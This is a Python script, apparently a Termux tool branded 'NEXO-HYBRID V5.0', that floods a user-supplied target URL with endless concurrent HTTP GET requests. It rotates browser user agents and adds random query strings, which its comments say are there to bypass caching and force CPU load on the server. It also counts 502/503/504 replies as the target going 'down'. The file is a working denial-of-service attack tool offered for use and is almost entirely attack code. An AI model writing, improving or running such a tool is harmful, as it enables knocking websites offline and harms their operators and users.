import asyncio
import aiohttp
import random
import time
import sys
import os

# --- NEXO Colors ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

def show_banner():
    os.system('clear')
    print(f"{R}{B}")
    print(r"  _   _  _______   _____    _    _ ______  _______      ____     __")
    print(r" | \ | | | ____\ \ / / _ \  | |  | |  ____|/ ____\ \    / /\ \   / /")
    print(r" |  \| | | |__   \ V / | | | | |__| | |__  | (___  \ \  / /  \ \_/ / ")
    print(r" | . ` | |  __|   > <| | | | |  __  |  __|  \___ \  \ \/ /    \   /  ")
    print(r" | |\  | | |____ / . \ |_| | | |  | | |____ ____) |  \  /      | |   ")
    print(r" |_| \_| |______/_/ \_\___/  |_|  |_|______|_____/    \/       |_|   ")
    print(f"{G}======================================================={W}")
    print(f"{Y}  PROJECT:     {W}NEXO-HYBRID V5.0")
    print(f"{Y}  TECH:        {W}ASYNC VELOCITY + SLOT OCCUPATION")
    print(f"{G}======================================================={W}\n")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
]

async def hybrid_attack(session, url, stats):
    while True:
        try:
            # Random strings to bypass server caching (Forces fresh CPU load)
            junk = random.randint(1000, 99999)
            target = f"{url}?nexo={junk}"
            
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'no-cache'
            }
            
            async with session.get(target, headers=headers, timeout=15) as response:
                stats['total'] += 1
                # Estimate weight: Headers (~500) + Junk (~100)
                stats['bytes'] += 600
                
                if response.status == 200:
                    stats['success'] += 1
                elif response.status in [502, 503, 504]:
                    stats['down'] += 1
                else:
                    stats['failed'] += 1
                
                # Small wait to prevent local Termux crash, but fast enough for heavy load
                await asyncio.sleep(0.001)

        except Exception:
            stats['errors'] += 1
            await asyncio.sleep(0.05)

async def monitor(stats, start_time):
    while True:
        elapsed = time.time() - start_time
        if elapsed > 0:
            rps = stats['total'] / elapsed
            total_mb = stats['bytes'] / (1024 * 1024)
            mbps = total_mb / elapsed
            
            sys.stdout.write(f"\r{C}Reqs: {stats['total']} | {G}Live: {stats['success']} | {R}Down: {stats['down']} | {Y}Data: {total_mb:.2f}MB | {B}Spd: {mbps:.2f}MB/s{W}")
            sys.stdout.flush()
        await asyncio.sleep(0.3)

async def main():
    show_banner()
    url = input(f"{Y}[?] Target URL: {W}").strip()
    if not url.startswith("http"):
        print(f"{R}[!] Error: Invalid URL Format!{W}")
        return

    # Pro Tip: Use 209 threads as you planned!
    try:
        power = int(input(f"{Y}[?] Attack Power (Threads): {W}"))
    except:
        return

    stats = {'total': 0, 'success': 0, 'failed': 0, 'down': 0, 'errors': 0, 'bytes': 0}
    start_time = time.time()

    print(f"\n{C}[*] Igniting NEXO Engines...{W}")
    time.sleep(1)

    # High-Performance Connector for Termux
    connector = aiohttp.TCPConnector(limit=None, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(monitor(stats, start_time))]
        for _ in range(power):
            tasks.append(asyncio.create_task(hybrid_attack(session, url, stats)))
        
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n\n{R}[!] NEXO V5.0 Terminated by User.{W}")

